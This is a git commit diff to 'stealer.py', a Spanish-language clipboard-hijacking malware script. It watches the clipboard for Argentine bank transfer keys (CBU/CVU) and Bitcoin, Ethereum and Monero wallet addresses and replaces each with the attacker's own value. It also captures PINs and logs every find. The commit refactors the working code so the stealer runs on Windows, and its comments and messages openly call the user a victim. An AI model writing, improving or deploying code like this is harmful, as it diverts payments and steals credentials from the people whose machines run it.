eddefa795c51d75998a237afc3d5701ce0c0580e
Adanzx <dibattista85@hotmail.com>
2022-08-24 18:50:43 -0300

    fix windows

--- stealer.py
+++ stealer.py
@@ -67,55 +67,45 @@ def monitorear():
             loguear_hallazgo(victima_portapapeles, "Alias bancario")
 
         #Chequear Clave Bancaria Uniforme / Clave Virtual Uniforme
-        #1 => Revisar el portapapeles
-        victima_portapapeles = pc.paste().decode("utf-8")
-        #2 => Compilar la expresión regular
+        #1 => Compilar la expresión regular
         mi_patron_cbu = re.compile(settings.patron_cbu_cvu)
-        #3 => Comparar portapapeles con reglas de CBU/CVU
+        #2 => Comparar portapapeles con reglas de CBU/CVU
         if mi_patron_cbu.match(victima_portapapeles):
             pc.copy(settings.atacante_cbu_cvu)
             print("🚨 Encontrado Clave Bancaria/Virtual Uniforme. Reemplazando... 😈")
             loguear_hallazgo(victima_portapapeles, "CBU/CVU")
 
         #Chequear Wallet BTC
-        #1 => Revisar el portapapeles
-        victima_portapapeles = pc.paste().decode("utf-8")
-        #2 => Compilar la expresión regular
+        #1 => Compilar la expresión regular
         mi_patron_btc = re.compile(settings.patron_wallet_btc)
-        #3 => Comparar portapapeles con reglas de BTC
+        #2 => Comparar portapapeles con reglas de BTC
         if mi_patron_btc.match(victima_portapapeles):
             pc.copy(settings.atacante_wallet_btc)
             print("🚨 Encontrado Wallet Bitcoin. Reemplazando... 😈")
             loguear_hallazgo(victima_portapapeles, "Wallet BTC")
 
         #Chequear Wallet ETH
-        #1 => Revisar el portapapeles
-        victima_portapapeles = pc.paste().decode("utf-8")
-        #2 => Compilar la expresión regular
+        #1 => Compilar la expresión regular
         mi_patron_eth = re.compile(settings.patron_wallet_eth)
-        #3 => Comparar portapapeles con reglas de ETH
+        #2 => Comparar portapapeles con reglas de ETH
         if mi_patron_eth.match(victima_portapapeles):
             pc.copy(settings.atacante_wallet_eth)
             print("🚨 Encontrado Wallet Ethereum Reemplazando... 😈")
             loguear_hallazgo(victima_portapapeles, "Wallet ETH")
 
         #Chequear Wallet XMR
-        #1 => Revisar el portapapeles
-        victima_portapapeles = pc.paste().decode("utf-8")
-        #2 => Compilar la expresión regular
+        #1 => Compilar la expresión regular
         mi_patron_xmr = re.compile(settings.patron_wallet_xmr)
-        #3 => Comparar portapapeles con reglas de XMR
+        #2 => Comparar portapapeles con reglas de XMR
         if mi_patron_xmr.match(victima_portapapeles):
             pc.copy(settings.atacante_wallet_xmr)
             print("🚨 Encontrado Wallet Monero. Reemplazando... 😈")
             loguear_hallazgo(victima_portapapeles, "Wallet XMR")
 
         #Chequear PIN
-        #1 => Revisar el portapapeles
-        victima_portapapeles = pc.paste().decode("utf-8")
-        #2 => Compilar la expresión regular
+        #1 => Compilar la expresión regular
         mi_patron_pin = re.compile(settings.patron_pin)
-        #3 => Comparar portapapeles con reglas de PIN
+        #2 => Comparar portapapeles con reglas de PIN
         if mi_patron_pin.match(victima_portapapeles):
             print("🚨 Encontrado PIN. Copiando... 😈")
             loguear_hallazgo(victima_portapapeles, "PIN")
